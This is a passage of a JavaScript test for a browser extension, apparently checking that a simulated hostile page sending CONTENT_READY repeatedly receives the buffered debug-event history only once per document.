    const replays = () => bg.tabMessages.filter(([tabId, m]) => tabId === 9 && m?.type === "ML_DEBUG_TO_PAGE").length;
    const sender = { ...hostilePage(9), documentId: "doc-1" };
    await bg.send({ type: "CONTENT_READY" }, sender); await tick();
    const first = replays();
    await bg.send({ type: "CONTENT_READY" }, sender); await tick();
    await bg.send({ type: "CONTENT_READY" }, sender); await tick();
    release();
    assert.ok(first > 0, "positive control: the run's history was buffered and the tab gets ML_DEBUG_TO_PAGE");
    assert.equal(replays(), first, `the same document got the history again: ${first} events after one CONTENT_READY, ${replays()} after three`);
});
